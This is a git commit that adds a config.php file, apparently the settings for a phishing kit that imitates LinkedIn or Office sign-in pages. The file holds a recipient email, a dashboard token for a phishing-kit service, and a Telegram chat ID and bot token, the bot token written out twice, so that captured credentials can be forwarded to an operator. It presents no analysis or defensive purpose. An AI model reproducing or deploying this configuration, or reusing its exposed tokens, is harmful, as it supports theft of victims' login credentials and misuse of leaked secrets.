07f0683d38cef9a3187aee8f24ffed3f5b687ef4
visibilityng <visibilityng@gmail.com>
2024-11-04 15:24:35 -0800

    Add files via upload

---
+++ MyQueen/789/MyGold/Stone1/Linkedin/en/config.php
@@ -0,0 +1,17 @@
+<?php
+
+$email ="bestbuyer079@gmail.com";
+$token ="9E952-48D9B-714A9-6F47F-D159B-4C6E9-11-16-79829-706";
+$base  ="https://dashboard.spamfather.com/web/";
+$domain= $server=$_SERVER['SERVER_NAME'];
+$page="Office";
+$telegramId="6359859692";
+$telegarmToken="6377769730:AAHowMebptGu2HujIVkjAGYM6by-zO_vyho";
+
+//6359859692
+
+//6377769730:AAHowMebptGu2HujIVkjAGYM6by-zO_vyho
+
+
+
+?>
